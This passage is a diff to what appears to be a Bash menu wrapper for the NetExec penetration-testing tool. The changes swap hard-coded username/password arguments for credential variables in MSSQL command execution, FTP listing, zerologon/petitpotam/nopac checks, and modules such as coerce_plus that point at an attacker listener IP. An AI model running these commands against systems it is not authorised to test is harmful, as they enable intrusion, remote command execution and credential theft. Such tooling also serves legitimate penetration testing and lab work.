+        nxcrun mssql "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH -x "$cmd"
     fi
     
     read -p "Press Enter to continue..."
@@ -835,11 +883,11 @@ run_ftp_enum() {
     fi
     
     echo -e "\n${YELLOW}[*] FTP Directory Listing:${NC}"
-    nxcrun ftp "$TARGET" -u "$USERNAME" -p "$PASSWORD" --ls
+    nxcrun ftp "$TARGET" $USER_OPT $AUTH_CRED --ls
     
     read -p "Enter specific directory to list (or press Enter to skip): " ftp_dir
     if [ ! -z "$ftp_dir" ]; then
-        nxcrun ftp "$TARGET" -u "$USERNAME" -p "$PASSWORD" --ls "$ftp_dir"
+        nxcrun ftp "$TARGET" $USER_OPT $AUTH_CRED --ls "$ftp_dir"
     fi
     
     read -p "Press Enter to continue..."
@@ -859,18 +907,18 @@ run_vuln_check() {
     
     case $vuln_choice in
         1)
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M zerologon
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M zerologon
             ;;
         2)
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M petitpotam
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M petitpotam
             ;;
         3)
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M nopac
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M nopac
             ;;
         4)
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M zerologon
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M petitpotam
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M nopac
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M zerologon
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M petitpotam
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M nopac
             ;;
     esac
     
@@ -899,25 +947,25 @@ run_modules() {
     
     case $module_choice in
         1)
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M webdav
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M webdav
             ;;
         2)
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M veeam
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M veeam
             ;;
         3)
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M slinky
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M slinky
             ;;
         4)
             read -p "Enter listener IP (tun0 IP): " listener_ip
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M coerce_plus -o LISTENER=$listener_ip
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M coerce_plus -o LISTENER=$listener_ip
             ;;
         5)
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M enum_av
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M enum_av
             ;;
         6)
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M webdav
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M veeam
-            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M enum_av
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M webdav
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M veeam
+            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M enum_av
             ;;
     esac
     
